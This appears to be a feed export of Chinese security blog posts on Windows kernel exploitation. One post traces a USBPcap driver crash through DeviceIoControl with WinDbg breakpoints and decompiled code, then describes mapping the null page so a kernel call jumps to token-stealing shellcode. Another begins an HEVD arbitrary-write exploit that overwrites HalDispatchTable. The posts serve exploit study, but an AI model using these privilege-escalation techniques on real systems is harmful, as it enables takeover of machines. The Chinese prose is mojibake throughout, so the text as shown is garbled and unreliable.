x86asm">nt!NtDeviceIoControlFile:840a07a9 8bff            <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>,<span class="hljs-built_in">edi</span>840a07ab <span class="hljs-number">55</span>              <span class="hljs-keyword">push</span>    <span class="hljs-built_in">ebp</span>840a07ac 8bec            <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebp</span>,<span class="hljs-built_in">esp</span>840a07ae 6a01            <span class="hljs-keyword">push</span>    <span class="hljs-number">1</span>840a07b0 ff752c          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">2Ch</span>]840a07b3 ff7528          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">28h</span>]840a07b6 ff7524          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">24h</span>]840a07b9 ff7520          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">20h</span>]840a07bc ff751c          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">1Ch</span>]840a07bf ff7518          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">18h</span>]840a07c2 ff7514          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">14h</span>]840a07c5 ff7510          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">10h</span>]840a07c8 ff750c          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">0Ch</span>]840a07cb ff7508          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">8</span>]840a07ce e8a682fbff      <span class="hljs-keyword">call</span>    nt!IopXxxControlFile (84058a79)840a07d3 <span class="hljs-number">5d</span>              <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">ebp</span>840a07d4 c22800          <span class="hljs-keyword">ret</span>     <span class="hljs-number">28h</span></code></pre><p>åæ¥æ‰å‘ç°æ˜¯å› ä¸ºï¼Œè¿™ä¸ª<code>DeviceIoControl</code>å› ä¸ºæ˜¯<code>#define FILE_DEVICE_FILE_SYSTEM         0x00000009</code>ï¼Œæ‰€ä»¥èµ°çš„æ˜¯å¦å¤–ä¸€æ¡è·¯ï¼Œåº”è¯¥æ˜¯åœ¨<code>nt!NtFsControlFile</code>ä¸­ä¸‹æ–­ç‚¹</p><p>æœ€ç»ˆæ¡ä»¶æ–­ç‚¹çš„æŒ‡ä»¤ä¸º</p><pre><code class="hljs apache"><span class="hljs-attribute">bp</span> nt!NtFsControlFile+<span class="hljs-number">0</span>x<span class="hljs-number">25</span> <span class="hljs-string">&quot;.printf\&quot;IOCTL:%p\&quot;,dwo(esp+0x14);.echo;g&quot;</span><span class="hljs-attribute">bp</span> nt!NtFsControlFile+<span class="hljs-number">0</span>x<span class="hljs-number">25</span> <span class="hljs-string">&quot;.if(dwo(esp+0x14)=0x00090000)&#123;&#125;.else&#123;gc;&#125;&quot;</span><span class="hljs-attribute">bp</span> nt!IofCallDriver+<span class="hljs-number">60</span> <span class="hljs-string">&quot;.if(ecx=0xd)&#123;&#125;.else&#123;gc;&#125;&quot;</span></code></pre><p>è¿™ä¸ªåœ°æ–¹ä¹Ÿå¯ä»¥ç”¨<code>poi</code>ï¼Œå…³äº<a href="https://stackoverflow.com/questions/37991872/how-to-reference-32bit-integer-data-in-a-64-bit-dump">dwo qwo poiçš„åŒºåˆ«</a>ï¼Œ<a href="https://stackoverflow.com/questions/6097157/conditional-breakpoint-that-tests-multiple-stack-variables">å¤šä¸ªæ¡ä»¶çš„æ–­ç‚¹</a>ï¼Œ<a href="https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2020/07/27/debugging_malwarewi-hk5u.html">echo</a></p><h2 id="è¯¥POCçš„æ•´ä¸ªæµç¨‹"><a href="#è¯¥POCçš„æ•´ä¸ªæµç¨‹" class="headerlink" title="è¯¥POCçš„æ•´ä¸ªæµç¨‹"></a>è¯¥POCçš„æ•´ä¸ªæµç¨‹</h2><p>ä¸ºäº†è°ƒè¯•å¼„æ¸…<code>DeviceIoControl</code>ä»ç”¨æˆ·æ€å¦‚ä½•åˆ°äº†é©±åŠ¨çš„<code>dispatch Handler</code>ï¼Œæˆ‘åœ¨å¦‚ä¸‹åœ°æ–¹ä¸‹äº†æ–­ç‚¹</p><pre><code class="hljs armasm"><span class="hljs-keyword">bp</span> kernel32!DeviceIoControl<span class="hljs-keyword">bp</span> kernel32!DeviceIoControlImplementation<span class="hljs-keyword">bp</span> kernelbase!DeviceIoControl</code></pre><p>å‘ç°é¦–å…ˆä¼šæ–­åœ¨<code>kernel32!DeviceIoControlImplementation</code>ï¼Œå†æ˜¯<code>kernel32!DeviceIoControl</code>ï¼Œæœ€åæ˜¯<code>kernelbase!DeviceIoControl</code></p><p>å› æ­¤è¯¥æµç¨‹åº”è¯¥å¦‚ä¸‹</p><p>ç”¨æˆ·æ€çš„<code>DeviceIoControl</code> </p><p>=&gt; å†…æ ¸çš„<code>ntoskrnl.exe</code>çš„<code>ZwDeviceIoControl</code>å‡½æ•°ï¼ˆé€šè¿‡<code>call KiSystemService</code>ï¼‰ </p><pre><code class="hljs c"><span class="hljs-function">NTSTATUS __stdcall <span class="hljs-title">ZwDeviceIoControlFile</span><span class="hljs-params">(...)</span></span><span class="hljs-function"></span>&#123;  __readeflags();  <span class="hljs-keyword">return</span> KiSystemService(<span class="hljs-number">8</span>);&#125;</code></pre><p>=&gt; å†…æ ¸<code>kernel32.dll</code>çš„<code>DeviceIoControlImplementation</code>ï¼ˆé€šè¿‡<code>call DeviceIoControl</code>ï¼‰</p><pre><code class="hljs c"><span class="hljs-function">BOOL __stdcall <span class="hljs-title">DeviceIoControlImplementation</span><span class="hljs-params">(...)</span></span><span class="hljs-function"></span>&#123;  DWORD v8; <span class="hljs-comment">// esi</span>  NTSTATUS v10; <span class="hljs-comment">// eax</span>  v8 = dwIoControlCode;  <span class="hljs-keyword">if</span> ( dwIoControlCode != <span class="hljs-number">0x2D4808</span> &amp;&amp; dwIoControlCode != <span class="hljs-number">0x74808</span> &amp;&amp; dwIoControlCode != <span class="hljs-number">0x90020</span>    || NtCurrentTeb()-&gt;ProcessEnvironmentBlock-&gt;SessionId == MEMORY[<span class="hljs-number">0x7FFE02D8</span>] )  &#123;    <span class="hljs-keyword">return</span> DeviceIoControl(...);  &#125;  v10 = IsTSAppCompatEnabled((BOOL *)&amp;dwIoControlCode);  <span class="hljs-keyword">if</span> ( v10 &gt;= <span class="hljs-number">0</span> )  &#123;    <span class="hljs-keyword">if</span> ( dwIoControlCode &amp;&amp; !IsCallerAdminOrSystem() )    &#123;      BaseSetLastNTError(<span class="hljs-number">-1073741790</span>);      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    <span class="hljs-keyword">return</span> DeviceIoControl(...);  &#125;  BaseSetLastNTError(v10);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>=&gt; å†…æ ¸<code>kernel32.dll</code>çš„<code>DeviceIoControl</code>ï¼ˆé€šè¿‡<code>plt</code>ï¼‰</p><pre><code class="hljs c"><span class="hljs-comment">// attributes: thunk</span><span class="hljs-function">BOOL __stdcall <span class="hljs-title">DeviceIoControl</span><span class="hljs-params">(...)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">return</span> __imp__DeviceIoControl@<span class="hljs-number">32</span>(...);&#125;</code></pre><p>=&gt; å†…æ ¸<code>kernelbase.dll</code>çš„<code>DeviceIoControl</code>ï¼Œåœ¨è¯¥å‡½æ•°é€šè¿‡åˆ¤æ–­æ˜¯å¦ä¸º<code>FILE_DEVICE_FILE_SYSTEM</code>è€Œåˆ¤æ–­è¿›<code>NtFsControlFile</code>è¿˜æ˜¯<code>NtDeviceIoControlFile</code></p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILE_DEVICE_FILE_SYSTEM         0x00000009</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILE_DEVICE_UNKNOWN             0x00000022</span></code></pre><pre><code class="hljs c"><span class="hljs-function">BOOL __stdcall <span class="hljs-title">DeviceIoControl</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        HANDLE hDevice,</span></span><span class="hljs-function"><span class="hljs-params">        DWORD dwIoControlCode,</span></span><span class="hljs-function"><span class="hljs-params">        LPVOID lpInBuffer,</span></span><span class="hljs-function"><span class="hljs-params">        DWORD nInBufferSize,</span></span><span class="hljs-function"><span class="hljs-params">        LPVOID lpOutBuffer,</span></span><span class="hljs-function"><span class="hljs-params">        DWORD nOutBufferSize,</span></span><span class="hljs-function"><span class="hljs-params">        LPDWORD lpBytesReturned,</span></span><span class="hljs-function"><span class="hljs-params">        LPOVERLAPPED lpOverlapped)</span></span><span class="hljs-function"></span>&#123;  HANDLE hEvent; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">int</span> Status; <span class="hljs-comment">// eax</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_STATUS_BLOCK</span> <span class="hljs-title">IoStatusBlock</span>;</span> <span class="hljs-comment">// [esp+10h] [ebp-20h] BYREF</span>  CPPEH_RECORD ms_exc; <span class="hljs-comment">// [esp+18h] [ebp-18h]</span>  <span class="hljs-keyword">if</span> ( !lpOverlapped )  &#123;    <span class="hljs-keyword">if</span> ( (dwIoControlCode &amp; <span class="hljs-number">0xFFFF0000</span>) == <span class="hljs-number">0x90000</span> )      Status = NtFsControlFile(                 hDevice,                 <span class="hljs-number">0</span>,                 <span class="hljs-number">0</span>,                 <span class="hljs-number">0</span>,                 &amp;IoStatusBlock,                 dwIoControlCode,                 lpInBuffer,                 nInBufferSize,                 lpOutBuffer,                 nOutBufferSize);    <span class="hljs-keyword">else</span>      Status = NtDeviceIoControlFile(                 hDevice,                 <span class="hljs-number">0</span>,                 <span class="hljs-number">0</span>,                 <span class="hljs-number">0</span>,                 &amp;IoStatusBlock,                 dwIoControlCode,                 lpInBuffer,                 nInBufferSize,                 lpOutBuffer,                 nOutBufferSize);    <span class="hljs-keyword">if</span> ( Status == <span class="hljs-number">0x103</span> )    &#123;      Status = NtWaitForSingleObject(hDevice, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);      <span class="hljs-keyword">if</span> ( Status &lt; <span class="hljs-number">0</span> )      &#123;LABEL_15:        <span class="hljs-keyword">if</span> ( (Status &amp; <span class="hljs-number">0xC0000000</span>) != <span class="hljs-number">-1073741824</span> )          *lpBytesReturned = IoStatusBlock.Information;        BaseSetLastNTError(Status);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;      &#125;      Status = IoStatusBlock.Status;    &#125;    <span class="hljs-keyword">if</span> ( Status &gt;= <span class="hljs-number">0</span> )    &#123;      *lpBytesReturned = IoStatusBlock.Information;      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">goto</span> LABEL_15;  &#125;  ....  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>å¦‚æœæ˜¯<code>NtDeviceIoControlFile</code>çš„è¯</p><pre><code class="hljs excel">=&gt; å†…æ ¸ ntdll.dll çš„ ZwDeviceIoControlFileï¼ˆ<span class="hljs-built_in">call</span> KiFastSystemCallï¼‰=&gt; å†…æ ¸ ntoskrnl.exe çš„ NtDeviceIoControlFile =&gt; å†…æ ¸ ntoskrnl.exe çš„ IopXxxControlFile</code></pre><p>å¦‚æœæ˜¯<code>NtFsControlFile</code>çš„è¯</p><pre><code class="hljs excel">=&gt; å†…æ ¸ ntdll.dll çš„ ZwFsControlFileï¼ˆ<span class="hljs-built_in">call</span> KiFastSystemCallï¼‰=&gt; å†…æ ¸ ntoskrnl.exe çš„ NtFsControlFile=&gt; å†…æ ¸ ntoskrnl.exe çš„ IopXxxControlFile</code></pre><p><code>IopXxxControlFile</code>å‡½æ•°ä¼šå¯¹<code>IRP</code>è¿›è¡Œå°è£…å’Œåˆ†å‘ï¼Œåœ¨<code>IopXxxControlFile</code>å‡½æ•°ä¸­ä¼šè°ƒç”¨<code>IopSynchronousServiceTail</code>ï¼Œåœ¨<code>IopSynchronousServiceTail</code>ä¸­ä¼šè°ƒç”¨<code>IofCallDriver</code></p><p>åœ¨<code>IofCallDriver</code>ä¸­ï¼Œå¯¹äºä¸åŒçš„<code>v5</code>è°ƒç”¨ä¹‹å‰é©±åŠ¨ä¸­è®¾ç½®å¥½çš„<code>dispatch Handler</code></p><pre><code class="hljs c"><span class="hljs-function">NTSTATUS __fastcall <span class="hljs-title">IofCallDriver</span><span class="hljs-params">(PDEVICE_OBJECT DeviceObject, PIRP Irp)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">unsigned</span> __int8 v5; <span class="hljs-comment">// cl</span>  <span class="hljs-keyword">char</span> v6; <span class="hljs-comment">// al</span>  <span class="hljs-keyword">void</span> *retaddr; <span class="hljs-comment">// [esp+Ch] [ebp+4h]</span>  <span class="hljs-keyword">if</span> ( pIofCallDriver )    <span class="hljs-keyword">return</span> pIofCallDriver(DeviceObject, Irp, retaddr);  <span class="hljs-keyword">if</span> ( --Irp-&gt;CurrentLocation &lt;= <span class="hljs-number">0</span> )    KeBugCheckEx(<span class="hljs-number">0x35</span>u, (ULONG_PTR)Irp, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);  v4 = Irp-&gt;Tail.Overlay.PacketType - <span class="hljs-number">36</span>;  Irp-&gt;Tail.Overlay.PacketType = v4;  v5 = *(_BYTE *)v4;  *(_DWORD *)(v4 + <span class="hljs-number">20</span>) = DeviceObject;  <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">22</span> &amp;&amp; ((v6 = *(_BYTE *)(v4 + <span class="hljs-number">1</span>), v6 == <span class="hljs-number">2</span>) || v6 == <span class="hljs-number">3</span>) )    <span class="hljs-keyword">return</span> IopPoHandleIrp();  <span class="hljs-keyword">else</span>    <span class="hljs-keyword">return</span> DeviceObject-&gt;DriverObject-&gt;MajorFunction[v5](DeviceObject, Irp);&#125;</code></pre><p>å…¶æ±‡ç¼–ä¸º<code>call    dword ptr [eax+ecx*4+38h] : ecx = 0xd</code>ï¼Œè€Œ<code>0xd</code>æ­£æ˜¯<code>IRP_MJ_FILE_SYSTEM_CONTROL</code></p><p>å› æ­¤å¯¹äºå½“å‰è¿™ä¸ª<code>POC</code>ï¼Œå…¶æ•´ä¸ª<code>DeviceIoControl</code>çš„æµç¨‹ä¸º</p><pre><code class="hljs erlang-repl">UserMode!DeviceIoControl -&gt; ntoskrnl!ZwDeviceIoControl -&gt; kernel32!DeviceIoControlImplementation -&gt; kernel32!DeviceIoControl -&gt; kernelbase!DeviceIoControl -&gt; ntdll!ZwFsControlFile -&gt; ntoskrnl!NtDeviceIoControlFile -&gt; ntoskrnl!IopXxxControlFile -&gt; ntoskrnl!IopSynchronousServiceTail -&gt; ntoskrnl!IofCallDriver -&gt; USBPcap!IRP_MJ_FILE_SYSTEM_CONTROL_dispatch_handler</code></pre><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>æœ€åè¿™ä¸ª<code>crash</code>ä½ç½®æ˜¯<code>83e57f7b 8b4608          mov     eax,dword ptr [esi+8]</code><br>è€Œæ­¤æ—¶ï¼Œ<code>esi=0x0</code>ï¼Œè¿™ä¸ªå†…å­˜ä¸å­˜åœ¨ï¼Œå› æ­¤å‡ºé”™ï¼Œè€Œ<code>win7</code>è¿˜å¯ä»¥å¯¹<code>0</code>åœ°å€è¿›è¡Œåˆ†é…å†…å­˜ï¼Œå› æ­¤å¯ä»¥ç›´æ¥åœ¨<code>0</code>åœ°æ–¹åˆ†é…å†…å­˜ï¼Œåˆ™æœ€åä¼š<code>call [eax+ecx*4+38h]</code>ï¼Œè€Œæ­¤æ—¶ï¼Œ<code>ecx=0xd</code>ï¼Œå› æ­¤ç›¸å½“äº<code>call [0x6c]</code></p><pre><code class="hljs x86asm">nt!IofCallDriver+<span class="hljs-number">0x57</span>:83e74f7b 8b4608          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esi</span>+<span class="hljs-number">8</span>]83e74f7e <span class="hljs-number">52</span>              <span class="hljs-keyword">push</span>    <span class="hljs-built_in">edx</span>83e74f7f 0fb6c9          <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">cl</span>83e74f82 <span class="hljs-number">56</span>              <span class="hljs-keyword">push</span>    <span class="hljs-built_in">esi</span>83e74f83 ff548838        <span class="hljs-keyword">call</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>+<span class="hljs-built_in">ecx</span>*<span class="hljs-number">4</span>+<span class="hljs-number">38h</span>]</code></pre><p>æŒ‰ç…§ä¹‹å‰çš„<code>HEVD</code>å†™ä¸ª<code>shellcode</code>ï¼Œ<code>steal token</code>å°±å¯ä»¥ææƒï¼Œæœ€åæ³¨æ„èƒ½ä½¿æµç¨‹æ­£å¸¸è¿”å›å³å¯</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å…¶å®æ¼æ´æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯åœ¨æ•´ä¸ªè¿‡ç¨‹çš„ç¯å¢ƒæ­å»ºå’Œè°ƒè¯•ç£¨äº†å¾ˆé•¿æ—¶é—´ï¼Œç„¶åç†Ÿæ‚‰äº†ä¸€ä¸‹<code>DeviceIoControl</code>çš„æ•´ä¸ªè°ƒç”¨é“¾</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="https://www.anquanke.com/post/id/86203">https://www.anquanke.com/post/id/86203</a><br><a href="https://www.exploit-db.com/exploits/41542">https://www.exploit-db.com/exploits/41542</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HEVD win7 x64 arbitrary write</title>
    <link href="/2022/06/29/HEVD%20win7%20x64%20arbitrary%20write/"/>
    <url>/2022/06/29/HEVD%20win7%20x64%20arbitrary%20write/</url>
    
    <content type="html"><![CDATA[<p>HEVD ä¸­çš„ä»»æ„åœ°å€å†™</p><pre><code class="hljs nsis">ç¯å¢ƒï¼šè™šæ‹Ÿæœºï¼š<span class="hljs-literal">Win7</span> SP1 x64ç‰©ç†æœºï¼š<span class="hljs-literal">Win10</span>debuggerï¼šwindbg previewcompilerï¼švs2022</code></pre><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>è§å‰ä¸€ç¯‡æ ˆæº¢å‡º</p><h2 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h2><p>å…¶ä¸­<code>arbitrary write</code>ä¸º<code>0x22200b</code></p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x22200B</span>:    DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;****** HEVD_IOCTL_ARBITRARY_WRITE ******\n&quot;</span>);    FakeObjectNonPagedPoolNxIoctlHandler = ArbitraryWriteIoctlHandler(Irp, CurrentStackLocation);    v7 = <span class="hljs-string">&quot;****** HEVD_IOCTL_ARBITRARY_WRITE ******\n&quot;</span>;    <span class="hljs-keyword">goto</span> LABEL_62;</code></pre><p>æ¼æ´ç‚¹ååˆ†ç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªä»»æ„åœ°å€å†™çš„æ¼æ´</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">ArbitraryWriteIoctlHandler</span><span class="hljs-params">(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)</span></span><span class="hljs-function"></span>&#123;  _NAMED_PIPE_CREATE_PARAMETERS *Parameters; <span class="hljs-comment">// rcx</span>  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span>  Parameters = IrpSp-&gt;Parameters.CreatePipe.Parameters;  result = <span class="hljs-number">0xC0000001</span>;  <span class="hljs-keyword">if</span> ( Parameters )    <span class="hljs-keyword">return</span> TriggerArbitraryWrite((_WRITE_WHAT_WHERE *)Parameters);  <span class="hljs-keyword">return</span> result;&#125;</code></pre><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">TriggerArbitraryWrite</span><span class="hljs-params">(_WRITE_WHAT_WHERE *UserWriteWhatWhere)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">unsigned</span> __int64 *What; <span class="hljs-comment">// rbx</span>  <span class="hljs-keyword">unsigned</span> __int64 *Where; <span class="hljs-comment">// rdi</span>  ProbeForRead(UserWriteWhatWhere, <span class="hljs-number">0x10</span>ui64, <span class="hljs-number">1u</span>);  What = UserWriteWhatWhere-&gt;What;  Where = UserWriteWhatWhere-&gt;Where;  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserWriteWhatWhere: 0x%p\n&quot;</span>, UserWriteWhatWhere);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] WRITE_WHAT_WHERE Size: 0x%X\n&quot;</span>, <span class="hljs-number">16</span>i64);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserWriteWhatWhere-&gt;What: 0x%p\n&quot;</span>, What);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserWriteWhatWhere-&gt;Where: 0x%p\n&quot;</span>, Where);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] Triggering Arbitrary Write\n&quot;</span>);  *Where = *What;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;&#125;</code></pre><p>è¾“å…¥<code>0x10</code>ä¸ªå­—èŠ‚ï¼ŒæŠŠ<code>what</code>ä¸Šçš„å†…å®¹èµ‹åˆ°<code>where</code>åœ°å€ä¸Š</p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ä¸ºäº†èƒ½æœ€åææƒï¼Œæˆ‘ä»¬åº”è¯¥åšä»€ä¹ˆ</p><p>æ‰¾ä¸ªå†…æ ¸çš„åœ°æ–¹å†™ï¼Ÿ<br>=&gt; éœ€è¦çŸ¥é“å†…æ ¸åœ°å€<br>=&gt; é€šè¿‡ <code>NtQuerySystemInformation/ZwQuerySystemInformation</code> æ¥å£è·å–å†…æ ¸çš„åŸºåœ°å€<br>=&gt; é€šè¿‡åŸºåœ°å€+åç§»è·å–åœ¨å†…æ ¸ä¸­çš„åœ°å€</p><p>å†™ä»€ä¹ˆåœ°æ–¹ï¼Ÿ<br>=&gt; å†…æ ¸ä¸­çš„å‡½æ•°æŒ‡é’ˆ<br>=&gt; é‚£è¿™ä¸ªå‡½æ•°æŒ‡é’ˆå¯¹åº”çš„æ¥å£åº”è¯¥æœ‰ä»€ä¹ˆç‰¹å¾å‘¢ï¼Ÿ<br>=&gt; åº”è¯¥è¾ƒå°‘è¢«å†…æ ¸è°ƒç”¨ï¼Œå¦åˆ™è¢«å…¶ä»–åœ°æ–¹è°ƒç”¨äº†ï¼Œå°±å¯èƒ½å¯¼è‡´å†…æ ¸å´©æºƒ &amp;&amp; å¯ä»¥é€šè¿‡ç”¨æˆ·æ€çš„ä¸€ä¸ªæ¥å£è¿›è¡Œè°ƒç”¨ï¼Œä»è€Œè§¦å‘å¯¹å‡½æ•°æŒ‡é’ˆçš„è°ƒç”¨<br>=&gt; æ‰¾åˆ°<code>HalDispatchTable</code>ä¸­åç§»ä¸º<code>0x8</code>ä½ç½®çš„<code>xHalSetSystemInformation</code>å‡½æ•°æŒ‡é’ˆæ¥å£å®Œç¾ç¬¦åˆï¼Œä¸Šå±‚å¯ç”±<code>NtQueryIntervalProfile</code>æˆ–<code>NtSetIntervalProfile</code>è°ƒç”¨</p><p>ï¼ˆP.S. è¿™é‡Œçš„æ€è·¯å¯å‚è€ƒè¿™ä¸ª<a href="https://shinnai.altervista.org/papers_videos/ECFID.pdf">ECFID.pdf</a> ï¼‰</p><p>æ•´ä¸ªæµç¨‹ç±»ä¼¼ä¸‹å›¾ï¼Œåœ¨ç”¨æˆ·ç©ºé—´å†™çš„è¿›ç¨‹ï¼Œå…ˆé€šè¿‡ä»»æ„åœ°å€å†™æ¼æ´ä¿®æ”¹äº†<code>HalDispatchTable</code>ï¼Œç„¶åé€šè¿‡ç”¨æˆ·æ€çš„æ¥å£è°ƒç”¨<code>NtQueryIntervalProfile</code>ï¼Œä»è€Œä½¿ç”¨äº†<code>xHalQuerySysttemInformation</code>è¿™ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæœ€åè·³è½¬åˆ°<code>shellcode</code>ä¸Š</p><p><img src="/img/HEVD-win7-x64-arbitrary-write/QQ%E6%88%AA%E5%9B%BE20220628204429.png" alt="æµç¨‹å›¾"></p><p>è¿™é‡Œè¯´æ˜ä¸€ä¸‹<code>Nt* | ZW*</code>åŒºåˆ«</p><ol><li>åœ¨<code>ntdll.dll</code>ä¸­ï¼Œ<code>Nt*</code>å’Œ<code>Zw*</code>åº”è¯¥æ˜¯æ²¡åŒºåˆ«ï¼Œè¿™ä¸ªæ˜¯è·‘åœ¨<code>ring3</code>çš„</li><li>åœ¨<code>ntoskrnl</code>ä¸­ï¼Œ<code>Nt*</code>å’Œ<code>Zw*</code>éƒ½æ˜¯è·‘åœ¨<code>ring0</code>ã€‚<code>Nt*</code>æ˜¯è¯¥æ¥å£çš„å…·ä½“å®ç°ï¼Œç»•è¿‡äº†<code>SSDT</code>ï¼Œè€Œ<code>Zw*</code>æ˜¯é€šè¿‡<code>SSDT</code>çš„<code>KiSystemService</code>è°ƒç”¨<code>ntoskrnl</code>ä¸­çš„<code>Nt*</code>å‡½æ•°ï¼ˆæˆ‘é€šè¿‡<code>uf</code>çœ‹çš„æ±‡ç¼–çš„æµç¨‹æ˜¯ï¼Œ<code>nt!Zw*</code>-&gt;<code>nt!KiServiceInternal</code>-&gt;<code>nt!KiSystemServiceStart</code>ï¼‰</li></ol><p>è¿™éƒ¨åˆ†çš„åŒºåˆ«å‚è€ƒä»¥ä¸‹åšå®¢<a href="https://blog.csdn.net/SysProgram/article/details/5805265">1</a>ï¼Œ<a href="https://blog.csdn.net/shenjianxz/article/details/52704046">2</a>ï¼Œ<a href="https://blog.csdn.net/evi10r/article/details/6742052">3</a>ï¼Œ<a href="https://codeantenna.com/a/fsxdbtaiWL">4</a>ï¼Œ<a href="https://blog.csdn.net/SysProgram/article/details/5805265">5</a></p><p>å…³äº<code>SSDT</code>çš„è¯´æ˜ï¼Œæœ‰<a href="https://bbs.pediy.com/thread-177772.htm">1</a>ï¼Œ<a href="https://bbs.pediy.com/thread-84946-1.htm">2</a>ï¼Œ<a href="https://www.anquanke.com/post/id/262577">3</a></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>æ•´ä¸ªæµç¨‹åº”è¯¥ä¸º</p><ol><li><code>GetKernelBaseSystemModule</code>ï¼šé€šè¿‡<code>NtQuerySystemInformation/ZwQuerySystemInformation</code>æ¥å£è·å–<code>SYSTEM_MODULE</code>ï¼Œä»è€Œè·å–å†…æ ¸çš„åŸºå€</li><li><code>GetHalDispatchTableAddress</code>ï¼šé€šè¿‡åŸºå€æ‰¾åˆ°<code>HalDispatchTable</code>åœ¨å†…æ 